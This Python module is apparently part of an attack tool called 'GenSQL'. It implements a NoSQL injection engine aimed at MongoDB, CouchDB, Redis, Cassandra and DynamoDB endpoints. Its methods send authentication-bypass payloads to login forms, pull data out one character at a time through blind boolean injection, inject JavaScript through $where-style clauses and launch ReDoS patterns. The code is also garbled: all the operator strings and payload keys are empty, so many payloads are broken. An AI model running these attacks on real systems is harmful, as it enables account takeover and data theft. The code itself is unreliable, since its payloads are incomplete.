#!/usr/bin/env python
"""
GenSQL Technique: NoSQL Injection (MongoDB, CouchDB, Redis, Cassandra, DynamoDB)
Author: Jeevraj
"""
import re, json, urllib.request, urllib.parse, urllib.error, time, random, string

class NoSQLInjector:
    """Advanced NoSQL injection engine supporting MongoDB, CouchDB, Redis, and more."""

    MONGO_OPERATORS = ["","","","","","","",
                       "","","","","",""]

    DETECTION_PAYLOADS = {
        "mongodb": [
            {"": ""},
            {"": ".*"},
            {"": "1==1"},
            {"": "invalid_value_xyz_123"},
        ],
        "couchdb": ['"_id":{"":null}', "?key=%22%22"],
        "redis":   ["*","KEYS *","INFO server"],
        "cassandra":["' OR '1'='1","1 OR 1=1"],
        "dynamodb": ['{"ComparisonOperator":"EXISTS"}'],
    }

    JS_WHERE_PAYLOADS = [
        "this.password.match(/.*/) || true",
        "function(){return true;}",
        "1; return true; var dummy=",
        "this.username.length > 0 || 1==1",
        "Object.keys(this).length > 0",
    ]

    REDOS_PATTERNS = [
        "^(a+)+$",
        "^([a-zA-Z]+)*$",
        r"^(\d+)+$",
        "^(a|a?)+$",
        "^(aa|a)*$",
    ]

    def __init__(self, db_type="mongodb", timeout=10):
        self.db_type = db_type.lower()
        self.timeout = timeout
        self._findings = []

    # ── Core injection methods ────────────────────────────────────────────
    def operator_injection(self, base_url, param, operator="", inject_value="invalid_xyz"):
        """Inject MongoDB comparison operator into a JSON parameter."""
        payload = {param: {operator: inject_value}}
        return self._send_json(base_url, payload)

    def regex_injection(self, base_url, param, pattern=".*"):
        """Inject  to match any value (auth bypass)."""
        payload = {param: {"": pattern, "": "i"}}
        return self._send_json(base_url, payload)

    def js_where_injection(self, base_url, js_code=None):
        """Inject JavaScript via MongoDB  clause."""
        js = js_code or random.choice(self.JS_WHERE_PAYLOADS)
        payload = {"": js}
        return self._send_json(base_url, payload)

    def aggregation_injection(self, base_url, collection, field):
        """Attempt aggregation pipeline injection via ."""
        payload = {
            "pipeline": [
                {"": {}},
                {"": {field: 1}},
                {"": 100}
            ]
        }
        return self._send_json(base_url, payload)

    def second_order_injection(self, store_url, retrieve_url, param, payload_value):
        """Store a malicious value then retrieve it to trigger second-order NoSQL injection."""
        store_resp = self._send_json(store_url, {param: payload_value})
        time.sleep(0.5)
        retrieve_resp = self._send_json(retrieve_url, {param: {"": ".*"}})
        return {"stored": store_resp, "retrieved": retrieve_resp}

    def redos_attack(self, base_url, param, pattern=None):
        """ReDoS via crafted regex in  operator."""
        pat = pattern or random.choice(self.REDOS_PATTERNS)
        payload = {param: {"": pat}}
        start = time.time()
        resp = self._send_json(base_url, payload)
        elapsed = time.time() - start
        return {"response": resp, "elapsed_ms": int(elapsed * 1000), "potential_redos": elapsed > 2.0}

    def blind_boolean_nosql(self, base_url, param, true_op="", false_op=""):
        """Blind boolean-based NoSQL injection."""
        true_resp  = self.operator_injection(base_url, param, true_op, "")
        false_resp = self.operator_injection(base_url, param, false_op, "")
        return {"true_response_len": len(str(true_resp)), "false_response_len": len(str(false_resp)),
                "injectable": len(str(true_resp)) != len(str(false_resp))}

    def detect_nosql_endpoint(self, response_body, response_headers):
        """Detect NoSQL-backed endpoint from error messages and headers."""
        indicators = {
            "mongodb": [r"mongoerror",r"e11000 duplicate",r"bsontype",r"objectid",r""],
            "couchdb": [r"couchdb",r"_id.*_rev",r"application/json.*_id"],
            "redis":   [r"redis",r"wrong number of arguments",r"ERR.*redis"],
            "cassandra":[r"cassandra",r"com\.datastax",r"cql.*error"],
            "dynamodb": [r"dynamodb",r"resourcenotfoundexception",r"com\.amazonaws\.dynamodb"],
        }
        combined = (str(response_body) + str(response_headers)).lower()
        for db, patterns in indicators.items():
            if any(re.search(p, combined, re.IGNORECASE) for p in patterns):
                return db
        return None

    def extract_data_nosql(self, base_url, param, field=None, max_length=32):
        """Character-by-character data extraction via blind boolean NoSQL injection."""
        results = []
        chars = string.ascii_letters + string.digits + "_@.-"
        extracted = ""
        for pos in range(1, max_length+1):
            found = False
            for ch in chars:
                pattern = "^" + re.escape(extracted) + re.escape(ch)
                payload = {param: {"": pattern}}
                resp = self._send_json(base_url, payload)
                if resp and self._is_true_response(resp):
                    extracted += ch
                    found = True
                    break
            if not found:
                break
        return extracted

    def auth_bypass_payloads(self, username_param="username", password_param="password"):
        """Generate auth bypass payloads for login forms."""
        return [
            {username_param: {"": ""}, password_param: {"": ""}},
            {username_param: "admin", password_param: {"": ""}},
            {username_param: {"": "invalid"}, password_param: {"": "invalid"}},
            {username_param: {"": "admin"}, password_param: {"": ".*"}},
            {username_param: {"": True}, password_param: {"": True}},
            {username_param: "admin", password_param: {"": ".*"}},
        ]

    # ── Internal helpers ──────────────────────────────────────────────────
    def _send_json(self, url, payload):
        try:
            data = json.dumps(payload).encode("utf-8")
            req = urllib.request.Request(url, data=data,
                                          headers={"Content-Type": "application/json",
                                                   "Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return {"status": resp.status, "body": resp.read().decode("utf-8","replace")}
        except Exception as ex:
            return {"error": str(ex)}

    def _is_true_response(self, resp):
        body = str(resp.get("body",""))
        return len(body) > 50 and resp.get("status",0) == 200

    def get_findings(self):
        return self._findings
